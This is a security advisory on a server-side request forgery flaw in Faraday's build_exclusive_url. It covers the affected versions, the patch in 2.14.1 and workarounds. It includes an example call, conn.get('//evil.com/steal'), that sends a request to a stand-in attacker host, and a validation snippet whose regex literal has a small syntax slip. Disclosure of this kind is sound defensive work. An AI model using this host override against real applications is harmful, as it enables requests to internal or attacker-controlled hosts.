summary: |
  Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url
  ### Impact

  Faraday's `build_exclusive_url` method (in `lib/faraday/connection.rb`)
  uses Ruby's `URI#merge` to combine the connection's base URL with
  a user-supplied path. Per RFC 3986, protocol-relative URLs
  (e.g. `//evil.com/path`) are treated as network-path references
  that override the base URL's host/authority component.

  This means that if any application passes user-controlled input to
  Faraday's `get()`, `post()`, `build_url()`, or other request
  methods, an attacker can supply a protocol-relative URL like
  `//attacker.com/endpoint` to redirect the request to an
  arbitrary host, enabling Server-Side Request Forgery (SSRF).

  The `./` prefix guard added in v2.9.2 (PR #1569) explicitly exempts
  URLs starting with `/`, so protocol-relative URLs bypass it entirely.

  **Example**
  ```ruby
  conn = Faraday.new(url: 'https://api.internal.com')
  conn.get('//evil.com/steal')
  # Request is sent to https://evil.com/steal instead of api.internal.com
  ```

  ### Patches

  Faraday v2.14.1 is patched against this security issue. All
  versions of Faraday up to 2.14.0 are affected.

  ### Workarounds

  **NOTE: Upgrading to Faraday v2.14.1+ is the recommended action
  to mitigate this issue, however should that not be an option
  please continue reading.**

  Applications should validate and sanitize any user-controlled
  input before passing it to Faraday request methods.
  Specifically:

  - Reject or strip input that starts with // followed by a
    non-/ character.
  - Use an allowlist of permitted path prefixes.
  - Alternatively, prepend ./ to all user-supplied paths before
    passing them to Faraday.

  Example validation:
  ```ruby
  def safe_path(user_input)
    raise ArgumentError, "Invalid path" if user_input.match?(r{\A//[^/]})
     user_input
  end
  ```
